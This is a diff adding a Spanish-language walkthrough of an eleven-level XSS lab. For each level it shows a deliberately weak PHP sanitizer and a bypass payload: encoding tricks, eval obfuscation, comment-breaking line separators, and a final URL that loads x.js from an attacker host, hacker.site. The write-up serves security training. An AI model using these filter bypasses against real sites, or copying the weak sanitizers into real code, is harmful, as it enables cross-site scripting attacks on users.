@@ -71,6 +71,338 @@
 
 <h2 id="laboratorios">Laboratorios</h2>
 
+<p>Enunciado:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS labs
+CodeName: Find Me!
+The XSS labs contain 11 challenges:
+Warm-up: XSS level 1
+Easy: XSS level 2
+Easy: XSS level 3
+Easy: XSS level 4
+Medium: XSS level 5
+Medium: XSS level 6
+Medium: XSS level 7
+Hard: XSS level 8
+Hard: XSS level 9
+Hard: XSS level 10
+Hard: XSS level 11
+Description
+The Find Me! labs do not need any introduction! The relevant code snippets are indicated in the challenge page itself.
+
+Each level generates HTML in an unsafe way, and you have to bypass some server-side PHP filters.
+
+The provided solutions are just a few of the many you can have. You can find the solutions at http://info.xss.labs/solutions
+
+As a suggestion, once you will finish these labs, you can try to solve them again using your way and alternative techniques.
+
+The full list of all the labs and the related descriptions are available at http://info.xss.labs/
+</code></pre></div></div>
+
+<p>Task:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Objective
+The main goal of these labs is to create a PoC triggering an alert box like this one:
+
+alert('l33t');
+If the exploitation has performed successfully, you'll see something like this:
+
+Content Image
+
+Of course, it must be executed without user interaction.
+
+Here's the lab setup:
+
+Content Image
+
+Tools
+The best tool for this lab are:
+
+Burp Suite
+Local/Remote server web
+A web browser
+</code></pre></div></div>
+
+<h2 id="indice">Indice</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. [Level 1](level1)
+2. [Level 2](level2)
+3. [Level 3](level3)
+4. [Level 4](level4)
+5. [Level 5](level5)
+6. [Level 6](level6)
+7. [Level 7](level7)
+8. [Level 8](level8)
+9. [Level 9](level9)
+10. [Level 10](level10)
+11. [Level 11](level11)
+</code></pre></div></div>
+
+<p>core.js :</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+	<span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#searcharea</span><span class="dl">'</span><span class="p">).</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+		<span class="kd">var</span> <span class="nx">input</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nf">val</span><span class="p">();</span>
+
+		<span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
+			<span class="na">url</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">search.php?keyword=</span><span class="dl">"</span><span class="o">+</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">input</span><span class="p">),</span>
+			<span class="na">cache</span> <span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+			<span class="na">type</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span>
+			<span class="na">success</span> <span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#results</span><span class="dl">"</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+			<span class="p">},</span>
+			<span class="na">error</span> <span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">xhr</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#results</span><span class="dl">"</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="dl">"</span><span class="s2">OMG (ﾉ`□´)ﾉ⌒┻━┻ &lt;br&gt; An error has occurred: &lt;br&gt;&lt;b&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">statusText</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/b&gt;</span><span class="dl">"</span><span class="p">);</span>
+				<span class="nx">console</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="nx">xhr</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">});</span>
+
+	<span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<h3 id="level-1">Level 1</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 1 	This level is just a warm-up to become familiar with the application.
+If you have problems here close everything because these are not labs for you! 	WARM-UP 	Simple warm-up
+</code></pre></div></div>
+
+<p>Función sanitizadora:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">// Let's start...</span>
+  <span class="k">return</span> <span class="s1">'Your search "&lt;b&gt;'</span> <span class="mf">.</span> <span class="nv">$search</span> <span class="mf">.</span> <span class="s1">'&lt;/b&gt;" did not match any products'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>inyección:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">l33t</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h3 id="level-2">Level 2</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 2 	The filter doesn't like the script tags. Are you able to create a valid vector still using the script tag? 	EASY 	To script, or not script.. 
+</code></pre></div></div>
+
+<p>Función sanitizadora:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">//To script, or not script.. </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#&lt;script([\s])*&gt;#is'</span><span class="p">,</span> <span class="no">NOSCRIPT</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+   
+  <span class="k">return</span> <span class="s1">'Your search "&lt;b&gt;'</span> <span class="o">+</span> <span class="nv">$search</span> <span class="o">+</span> <span class="s1">'&lt;/b&gt;" did not match any products'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>inyección:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="err">&lt;</span><span class="na">script</span><span class="nt">&gt;</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">l33t</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h3 id="level-3">Level 3</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 3 	The script tag filters smeems stronger, isn't it? Alternatives? 	EASY 	To script, or not script... this is no more the problem 
+</code></pre></div></div>
+<p>Función sanicitadora:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">//To script, or not script... this is no more the problem</span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#&lt;script(.*?)&gt;#is'</span><span class="p">,</span> <span class="no">NOSCRIPT</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+   
+  <span class="k">return</span> <span class="s1">'Your search "&lt;b&gt;'</span> <span class="o">+</span> <span class="nv">$search</span> <span class="o">+</span> <span class="s1">'&lt;/b&gt;" did not match any products'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Inyección:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span><span class="err">/</span><span class="na">src</span> <span class="na">onerror=</span><span class="s">alert('l33t')</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="level-4">Level 4</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 4 	You know, script tag must be closed and without the events where's the party? 	EASY 	No SCRIPT and no ON? No party then! 
+</code></pre></div></div>
+
+<p>Función Sanitizadora:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">//Script must be closed, here's a stronger filter... isn't it? </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#&lt;script(.*?)&gt;(.*?)&lt;/script(.*)?&gt;#is'</span><span class="p">,</span> <span class="no">NOSCRIPT</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+  <span class="c1">//No ON no party!  </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#(on\w+\s*=)#s'</span><span class="p">,</span> <span class="no">NOEVENTS</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+  
+  <span class="k">return</span> <span class="s1">'Your search "&lt;b&gt;'</span> <span class="o">+</span> <span class="nv">$search</span> <span class="o">+</span> <span class="s1">'&lt;/b&gt;" did not match any products'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Inyección:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;svg&gt;&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">l33t</span><span class="dl">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="level-5">Level 5</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 5 	Let's start encoding a little bit 	MEDIUM 	No ON and no Functions? No path then 
+</code></pre></div></div>
+<p>Función Sanitizadora:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">//No ON no party!  </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#(on\w+\s*=)#s'</span><span class="p">,</span> <span class="no">NOEVENTS</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+  <span class="c1">//No Functions no party! </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#[()]#s'</span><span class="p">,</span> <span class="no">NOFUNCTIONS</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+   
+  <span class="k">return</span> <span class="s1">'Your search "&lt;b&gt;'</span> <span class="o">+</span> <span class="nv">$search</span> <span class="o">+</span> <span class="s1">'&lt;/b&gt;" did not match any products'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Inyección:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;svg&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="o">&amp;</span><span class="nx">lpar</span><span class="p">;</span><span class="dl">'</span><span class="s1">l33t</span><span class="dl">'</span><span class="o">&amp;</span><span class="nx">rpar</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h3 id="level-6">Level 6</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 6 	Do you remember your goal? What if I told you that the alert function is blocked? 	MEDIUM 	No alert no party! 
+</code></pre></div></div>
+
+<p>Función Sanitizadora:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">//No alert no party!  </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#alert#is'</span><span class="p">,</span> <span class="no">NOALERT</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+
+   
+  <span class="k">return</span> <span class="s1">'Your search "&lt;b&gt;'</span> <span class="o">+</span> <span class="nv">$search</span> <span class="o">+</span> <span class="s1">'&lt;/b&gt;" did not match any products'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Inyección:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="err">\</span><span class="nf">u0061lert</span><span class="p">(</span><span class="dl">'</span><span class="s1">l33t</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h3 id="level-7">Level 7</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 7 	No more Unicode escaping.. there are a lot of smart guys out of there. Finally alert is blocked, isn't it? 	MEDIUM 	Am I still able to obfuscate?
+</code></pre></div></div>
+
+<p>Función sanitizadora:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">// No Unicode escaping.. there are a lot of smart guys out of there...</span>
+  <span class="c1">// Thanks to stackoverflow.com &gt; http://bit.ly/SO_decode_unicode</span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'/\\\\u([0-9a-fA-F]{4})/'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$m</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">return</span> <span class="nb">mb_convert_encoding</span><span class="p">(</span><span class="nb">pack</span><span class="p">(</span><span class="s1">'H*'</span><span class="p">,</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="s1">'UTF-8'</span><span class="p">,</span> <span class="s1">'UCS-2BE'</span><span class="p">);</span>
+  <span class="p">},</span> <span class="nv">$search</span><span class="p">);</span>
+   
+  <span class="c1">//No alert no party!  </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#alert#is'</span><span class="p">,</span> <span class="no">NOALERT</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="s1">'Your search "&lt;b&gt;'</span> <span class="o">+</span> <span class="nv">$search</span> <span class="o">+</span> <span class="s1">'&lt;/b&gt;" did not match any products'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Inyección:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nf">eval</span><span class="p">(</span><span class="dl">'</span><span class="se">\</span><span class="s1">x61lert(</span><span class="se">\'</span><span class="s1">l33t</span><span class="se">\'</span><span class="s1">)</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h3 id="level-8">Level 8</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 8 	You need to break a commented line 	ADVANCED 	Breaking bad...
+</code></pre></div></div>
+
+<p>Función sanitizadora:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">// Breaking bad... </span>
+   
+  <span class="c1">//No alert no party!  </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#alert#is'</span><span class="p">,</span> <span class="no">NOALERT</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="sh">&lt;&lt;&lt;RESULT
+   No products here.. 
+   &lt;!-- todo: debug this --&gt;
+   &lt;script&gt;
+      //console.debug( $search );
+   &lt;/script&gt;
+RESULT;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>inyección: NL == new Line</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[NL]eval('\x61lert(\'l33t\')'
+</code></pre></div></div>
+
+<h3 id="level-9">Level 9</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 9 	You need to break a commented line and bypass classic ways to break a line 	ADVANCED 	Breaking bad, season 2...
+</code></pre></div></div>
+
+<p>Función sanitizadora:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">// Breaking bad... more stronger</span>
+   <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#[\n\r]#'</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+   
+  <span class="c1">//No alert no party!  </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#alert#is'</span><span class="p">,</span> <span class="no">NOALERT</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="sh">&lt;&lt;&lt;RESULT
+   No products here.. 
+   &lt;!-- todo: debug this --&gt;
+   &lt;script&gt;
+      //console.debug( $search );
+   &lt;/script&gt;
+RESULT;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Inyección:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[\u2028]eval('\x61lert(\'l33t\')'
+</code></pre></div></div>
+
+<h3 id="level-10">Level 10</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 10 	A mix of rules block you to create the function alert and also the alternative ways to create strings, but not all.. 	ADVANCED 	The numbers rule the world
+</code></pre></div></div>
+
+<p>Función sanitizadora:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+  <span class="c1">// No more string ...</span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#[\'"+]#'</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+  <span class="c1">// ... no more alert ...  </span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#alert#is'</span><span class="p">,</span> <span class="no">NOALERT</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+  <span class="c1">// ... no no more alternative ways!</span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#.source#is'</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+  <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#.fromCharCode#is'</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="s1">'Your search "&lt;b&gt;'</span> <span class="o">+</span> <span class="nv">$search</span> <span class="o">+</span> <span class="s1">'&lt;/b&gt;" did not match any products'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Inyección:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nf">eval</span><span class="p">(</span><span class="mi">8680439</span><span class="p">..</span><span class="nf">toString</span><span class="p">(</span><span class="mi">30</span><span class="p">))(</span><span class="mi">983801</span><span class="p">..</span><span class="nf">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">))</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h3 id="level-11">Level 11</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSS 11 	Bypass the gorilla and you'll become a l33t 	ADVANCED 	OMG a gorilla! 
+</code></pre></div></div>
+
+<p>Función snitizadora:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Sanitizer</span><span class="p">(</span><span class="nv">$search</span><span class="p">){</span>
+   <span class="c1">// No scripts from untrusted origins or you'll see a nice gorilla</span>
+   <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'#^(?:https?:)?\/\/11.xss.labs\/#is'</span><span class="p">,</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$search</span><span class="p">),</span> <span class="nv">$matches</span><span class="p">);</span>   
+   <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$matches</span><span class="p">))</span> <span class="nv">$search</span> <span class="o">=</span> <span class="s2">"...untrusted..."</span><span class="p">;</span>   
+
+   <span class="c1">// don't break the src tag   </span>
+   <span class="nv">$search</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#"#'</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
+   <span class="c1">// ehehe and now? Are you still a ninja?</span>
+   <span class="nv">$search</span> <span class="o">=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$search</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Inyección:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://11.xss.labs%2f@hacker.site/x.js
+</code></pre></div></div>
+
 <p><a href="./">back</a></p>
 
 
